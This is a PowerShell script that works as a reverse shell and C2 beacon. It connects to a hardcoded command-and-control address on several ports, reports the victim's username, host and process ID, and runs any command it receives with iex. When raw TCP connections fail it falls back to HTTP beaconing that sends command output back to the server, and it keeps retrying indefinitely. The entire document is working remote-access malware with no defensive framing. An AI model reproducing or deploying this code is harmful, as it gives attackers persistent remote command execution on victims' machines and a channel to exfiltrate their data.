# Multi-Port Resilient Shell
# Tries multiple ports/methods for maximum reliability
# If one fails, falls back to next

$C2_IP = "192.168.0.100"
$PORTS = @(4444, 5555, 443, 80, 8080)  # Try these in order
$RETRY_DELAY = 5

function Try-TCP {
    param([int]$Port)
    try {
        $c = New-Object Net.Sockets.TCPClient($C2_IP, $Port)
        $s = $c.GetStream()
        $w = New-Object IO.StreamWriter($s)
        $r = New-Object IO.StreamReader($s)
        $w.AutoFlush = $true
        $w.WriteLine("[MULTI:$Port] $env:USERNAME@$env:COMPUTERNAME | PID:$PID")

        while($c.Connected) {
            $w.Write("PS[$Port]> ")
            $cmd = $r.ReadLine()
            if(-not $cmd -or $cmd -eq "exit") { break }
            try { $out = (iex $cmd 2>&1 | Out-String) } catch { $out = $_.ToString() }
            $w.WriteLine($out)
        }
        $c.Close()
        return $true
    } catch {
        return $false
    }
}

function Try-HTTP {
    param([int]$Port)
    try {
        $id = "$env:COMPUTERNAME-$PID"
        $url = "http://${C2_IP}:${Port}"

        # Register
        $body = @{id=$id; user="$env:USERDOMAIN\$env:USERNAME"; host=$env:COMPUTERNAME; data="[HTTP:$Port] Connected"} | ConvertTo-Json
        Invoke-RestMethod -Uri "$url/beacon" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5 | Out-Null

        # Beacon loop
        while($true) {
            $body = @{id=$id; data=""} | ConvertTo-Json
            $resp = Invoke-RestMethod -Uri "$url/beacon" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 10
            if($resp.cmd) {
                if($resp.cmd -eq "exit") { break }
                try { $out = iex $resp.cmd 2>&1 | Out-String } catch { $out = $_.ToString() }
                $body = @{id=$id; data=$out} | ConvertTo-Json
                Invoke-RestMethod -Uri "$url/beacon" -Method POST -Body $body -ContentType "application/json" | Out-Null
            }
            Start-Sleep 3
        }
        return $true
    } catch {
        return $false
    }
}

# Main loop - keep trying until something works
while($true) {
    foreach($port in $PORTS) {
        Write-Host "[*] Trying port $port..." -ForegroundColor Yellow

        # Try TCP first
        if(Try-TCP -Port $port) { continue }

        # Try HTTP on common web ports
        if($port -in @(80, 443, 8080)) {
            if(Try-HTTP -Port $port) { continue }
        }
    }

    Write-Host "[-] All ports failed, retrying in $RETRY_DELAY seconds..." -ForegroundColor Red
    Start-Sleep $RETRY_DELAY
}
